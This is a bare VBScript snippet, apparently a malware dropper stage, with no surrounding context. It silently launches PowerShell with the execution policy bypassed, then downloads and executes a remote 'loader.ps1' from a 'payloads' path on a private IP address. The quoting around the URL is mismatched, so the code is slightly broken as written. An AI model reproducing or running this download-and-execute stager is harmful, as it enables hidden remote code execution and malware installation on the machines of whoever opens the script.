Set objShell = CreateObject("Wscript.Shell")
objShell.Run "powershell.exe -ExecutionPolicy Bypass -Command ""IEX (New-Object Net.WebClient).DownloadString(https://172.24.1.83:443/payloads/loader.ps1')""", 0, False
